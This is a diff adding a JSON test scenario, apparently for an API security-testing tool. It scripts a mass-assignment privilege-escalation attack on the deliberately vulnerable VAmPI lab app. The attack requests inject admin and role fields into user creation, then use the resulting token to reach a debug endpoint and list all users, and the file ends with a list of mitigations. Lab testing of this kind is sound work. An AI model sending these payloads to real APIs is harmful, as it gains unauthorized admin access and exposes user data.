@@ -1,0 +1,176 @@
+{
+  "id": "vampi-mass-assignment-privilege-escalation",
+  "name": "VAmPI - Mass Assignment Privilege Escalation",
+  "category": "API Security",
+  "difficulty": "Intermediate",
+  "description": "Exploits mass assignment vulnerability in VAmPI user creation endpoint to create admin users by injecting additional fields",
+  "kind": "scenario",
+  "tags": [
+    "vampi",
+    "mass-assignment",
+    "privilege-escalation",
+    "api",
+    "owasp-api-6"
+  ],
+  "target": "http://localhost:5000",
+  "estimatedDuration": "3-5 minutes",
+  "documentation": "https://github.com/erev0s/VAmPI",
+  "prerequisites": [
+    "VAmPI running on localhost:5000"
+  ],
+  "phases": [
+    {
+      "name": "reconnaissance",
+      "duration": 60,
+      "description": "API endpoint discovery and schema analysis"
+    },
+    {
+      "name": "weaponization",
+      "duration": 120,
+      "description": "Craft mass assignment payloads with admin fields"
+    },
+    {
+      "name": "delivery",
+      "duration": 180,
+      "description": "Submit malicious user creation requests"
+    },
+    {
+      "name": "exploitation",
+      "duration": 240,
+      "description": "Verify elevated privileges and access admin functions"
+    }
+  ],
+  "attackVectors": [
+    {
+      "classification": "MassAssignment",
+      "severity": "High",
+      "owasp": "API6:2023 Unrestricted Access to Sensitive Business Flows"
+    }
+  ],
+  "expectedResults": {
+    "successCriteria": [
+      "User created with admin privileges",
+      "Access to /users/v1/_debug endpoint",
+      "Ability to enumerate all users",
+      "JWT token with elevated claims"
+    ],
+    "indicators": [
+      "HTTP 200 on admin-only endpoints",
+      "Admin flag visible in user profile",
+      "Access to sensitive debug information"
+    ]
+  },
+  "mitigations": [
+    "Implement allowlist for user-controllable fields",
+    "Separate DTOs for user input vs internal models",
+    "Validate and sanitize all input parameters",
+    "Never bind request data directly to domain objects",
+    "Use framework features to prevent mass assignment"
+  ],
+  "steps": [
+    {
+      "id": "api-root",
+      "name": "Discover API endpoints from root documentation",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/"
+      }
+    },
+    {
+      "id": "normal-user-creation",
+      "name": "Create normal user to understand baseline",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/createUser",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "testuser",
+          "password": "pass123",
+          "email": "test@example.com"
+        }
+      }
+    },
+    {
+      "id": "mass-assignment-admin",
+      "name": "Attempt privilege escalation via admin field injection",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/createUser",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "eviluser",
+          "password": "evil123",
+          "email": "evil@example.com",
+          "admin": true
+        }
+      }
+    },
+    {
+      "id": "mass-assignment-role",
+      "name": "Try multiple privilege-related field names",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/createUser",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "eviluser2",
+          "password": "evil456",
+          "email": "evil2@example.com",
+          "role": "admin",
+          "is_admin": 1,
+          "privilege_level": 100
+        }
+      }
+    },
+    {
+      "id": "login-escalated",
+      "name": "Login with escalated account to get JWT",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/login",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "eviluser",
+          "password": "evil123"
+        }
+      }
+    },
+    {
+      "id": "verify-admin-access",
+      "name": "Access admin-only debug endpoint",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/users/v1/_debug",
+        "headers": {
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        }
+      }
+    },
+    {
+      "id": "list-all-users",
+      "name": "Enumerate all users to verify elevated access",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/users/v1",
+        "headers": {
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        }
+      }
+    }
+  ]
+}
